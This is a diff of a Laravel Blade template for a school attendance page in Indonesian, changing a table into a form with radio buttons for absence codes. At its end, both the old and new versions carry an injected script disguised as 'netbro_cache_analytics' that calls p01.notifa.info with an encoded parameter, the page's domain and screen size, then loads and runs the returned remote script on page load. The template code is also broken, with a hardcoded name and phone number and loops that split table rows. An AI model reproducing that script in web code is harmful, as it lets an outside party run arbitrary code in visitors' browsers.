@@ -1,5 +1,8 @@
+
 @extends('layouts.admin')
 @section('content')
+
+
 
 <!DOCTYPE html>
 <html>
@@ -10,65 +13,127 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <title>SISTEM ABSENSI REAL TIME</title>
-
-    <!-- Core CSS - Include with every page -->
-    <link href="css/bootstrap.min.css" rel="stylesheet">
-    <link href="font-awesome/css/font-awesome.css" rel="stylesheet">
-
- 
+    <link href="css/bootstrap.min.css" rel="stylesheet">   
 </head>
 
 <body>
+
+     
                     <div class="panel panel-default">
                         <div class="panel-heading">
-                       
-                            {{ Auth::user()->name }} |{{ Auth::user()->name }}| 
-                            {{ Auth::user()->name }}                        
+                            Data Siswa Kelas XII         
                         </div>
+              
+      <div class="panel-body">
+                <form action="{{ route('absensi_siswa.store') }}" method="post" >
+                    {{ csrf_field() }}
+                      
+                                <table class="table table-striped table-bordered table-hover" id="dataTables-example">
+                                    <thead>
+                                        <tr>
+                                            <th class="text-center">Nama Siswa</th>
+                                            <th class="text-center">Nama Kelas</th>
+                                            <th class="text-center">Tanggal</th>
+                                            <th class="text-center">Petugas Piket</th>
+                                            <th class="text-center">Keterangan</th>
 
-                        <!-- /.panel-heading -->
-                        <div class="panel-body">
-                            <div class="table-responsive">
-                  
-                            <div class="well">
-                                <h4 class="text-center">2017</h4>
-                            </div>
-                                <table class="table table-striped table-bordered table-hover">
-  
-                                        
-
-
-<tr>
-<td colspan="11" class="text-center info">July</td>
-</tr>
-<tr>
-    
-<td class="success text-center" >Tanggal</td>
-<td  colspan="5" class="text-center success">Keterangan</td>
-<td  colspan="5" class="text-center success">Petugas Piket</td>
-
-</tr>
-                        
-<tr>
-                        @php $no = 1; @endphp
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <tr class="odd gradeX">
+                                  @php $no = 1; @endphp
                         @foreach($absensi_siswa as $data)
-    <td class="text-center">{{ $data->tanggal }}</td>
+    <td>
+                            <a class="btn btn-warning" href="{{ route('absensi_siswa.edit',$data->id) }}">Edit</a>
+                        </td>
+
+                                            <td>a</td>
+                                            <td>Alfaiz Faroko</td>
+                                            <td class="text-center">Laki - Laki</td>
+
+                                            <td>81332036346</td>
+                                            <td class="text-center">
+                                            <div class="form-group">
+
+                        
+           @endforeach                                 
+                                            <label class="radio-inline">
+                                                <input type="radio" name="keterangan" value="A" checked >A
+                                            </label>
+                                            <label class="radio-inline">
+                                                <input type="radio" name="keterangan" value="I">I
+                                            </label>
+                                            <label class="radio-inline">
+                                                <input type="radio" name="keterangan" value="S">S
+                                            </label>
+
+                                            <label class="radio-inline">
+                                                <input type="radio" name="keterangan" value="M" >M
+                                            </label>
+
+                                            <label class="radio-inline">
+                                                <input type="radio" name="keterangan" value="N" >N
+                                            </label>
 
 
-<td colspan="5" class="text-center">{{ $data->keterangan }}</td>
-<td colspan="5" class="text-center">{{ $data->petugas_piket->nama_petugas }}</td>
-</tr>
 
+                                        </div>
+
+                                            </td>
+
+                                        </tr>
+                                
+                     @php $no = 1; @endphp
+                        @foreach($absensi_siswa as $data)
+
+                                        <tr class="odd gradeX">
+                                            <td>{{$data->nis}}</td>
+                                            <td>Alfaiz Faroko</td>
+                                            <td class="text-center">Laki - Laki</td>
+
+                                            <td>81332036346</td>
+                                            <td class="text-center">
    @endforeach  
-                  
+
+                                                                                    <div class="form-group">
+
+
+
+                                            
+                                            <label class="radio-inline">
+                                                <input type="radio" name="2" value="A" checked >A
+                                            </label>
+                                            <label class="radio-inline">
+                                                <input type="radio" name="2" value="I">I
+                                            </label>
+                                            <label class="radio-inline">
+                                                <input type="radio" name="2" value="S">S
+                                            </label>
+
+                                            <label class="radio-inline">
+                                                <input type="radio" name="2" value="M" >M
+                                            </label>
+
+                                                <label class="radio-inline">
+                                                <input type="radio" name="2" value="N" >N
+                                            </label>
+
+
+
+
+                                        </div>
+
+                                            </td>
+
+                                        </tr>
+                                    </tbody>
                                 </table>
+                                        <button type="submit" class="btn btn-success">SImpan Data</button>
 
+</form>
                             </div>
-
-
-
-
                             <!-- /.table-responsive -->
+<br>
                             <div class="well">
                                 <h4>Keterangan Absensi</h4>
                                 <p>A = Tidak Masuk Tanpa Keterangan</p>
@@ -76,14 +141,17 @@
                                 <p>S = Tidak Masuk Ada Surat Dokter Atau Pemberitahuan</p>
                                 <p>M = Hadir</p>
                                 <p>N = Belum Ada Keterangan Absensi</p>
-                                <p>L = Hari Libur </p>
 
                             </div>
                         </div>
                         <!-- /.panel-body -->
-                    </div>
                     <!-- /.panel -->
-      
+                <!-- /.col-lg-12 -->
+            <!-- /.row -->
+     
+    </div>
+    <!-- /#wrapper -->
+
     <!-- Core Scripts - Include with every page -->
     <script src="js/jquery-1.10.2.js"></script>
     <script src="js/bootstrap.min.js"></script>
@@ -103,7 +171,7 @@
     });
     </script>
 
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mLjcjWn%2bvCNaJ85cVa7QpLexe2F3tjA0kdh4v0bUhBXB%2bTKh9mk5nopbRFTkfQfeIMLMGLBY1jTK9XcL4%2fnBrZWhmQoC3kzoPe5MPfKT59U9mXOWsfHC4S%2bOZPL5wPtvSCtljRSLBOPFJTexgl8o%2bi%2fsPKy4wxY7gxJPgf9I7TSgJmEcA3j29byq8ONfHAtGoAQAB8A2mgS%2bZoqdSmS6In3PRsWqzjE7tbfC%2fGztDF6fjFyZkJBcIRz4aZrGgUnnVOUVPlCESepDO8FVwc8ns2xEveWjyIbRps4AWKTOW8DVempi2PlBiKwhpLMg%2b1wwV8hitWGX4iHWzO8zK4hu%2fTKignfEAV4%2fzVIXNeKy8LQt09rxmWUV1TwuHU0Kp4mq9z9GlJBOPTpf7wmgxEXRm7eKjovuSNryyYgHOPd3U8MORMeWOAkPS8tzAwZjmqJehKL4GvvCuIN%2bUSVt0NHrJJ6pA2pSvTg5CDVPiilVAUx%2bUO%2ftJrLHR1MtfYCdnY0MjRhJWVhX%2bfm0C3XDL%2br%2blTit7U9UkrTy5OrJOMz%2fM9pjBFhixWV1tdVyfddYqoXKnkpPtMJCQqknbwmp%2fKWG%2bYRPAu3VXtWMc" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mmyzvyD5SJF0z%2fovUeckqQqvlyL5D1cKpm75nbW6r6PIeHcYOHKlYoaga65dxZzN3nAlm2gBEtR2%2fqYgyxmuCn7JCE5Ioxt4ePvAsDu%2bawQpclWeXYjcTRoAltj3tD8L4dV3EoLrn0pH4MFCdlXrJKqX1qwGN06DzN0wkmIPSuoIkRlMsn2fe0iYlqCv0T3MEs35F8rH4rjXs2JPBQfg5qXD7GLW3rg2ppRBAIcBWJU9QXGx67T1VSnA7rsMRgFiOnZq2I%2fAxdpxov7U7BJzltyviBMXEPDnNO0e0eKKNQWnWNm5af4x2zMa0X93cis%2fac0hqw6Hx5T3RLZORkwBBo71%2brPWay1JXIn39sYIxVgUgWyk8NrGoiKOyOLFaLDBJXw1Ao%2f%2b%2bNS%2bwP7gMRJSyD%2fGFYwXBzM2ddlEQDCXlypUe3afF%2f8P1xdWxu2jQriHmJpZtR7Fy1D7PCcx%2ft5Owb7FJGotV9glHTx%2fv622Vu%2fED1XmWg0bhdPLu6fGBMSPhAaBuiS40a%2bPMwP3CPkkkoc6aFMaOUQnEypX393c05SPiLjXYvJvA2wl%2bILduP10%2bAmxoBbZQ8U%2bHXQFPXrj6GmFB58DorlohKh7mjBZaVoL3Z%2fctrR7FFzHBcMm1CFpyBYRRriXyXTk%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
 </html>
 
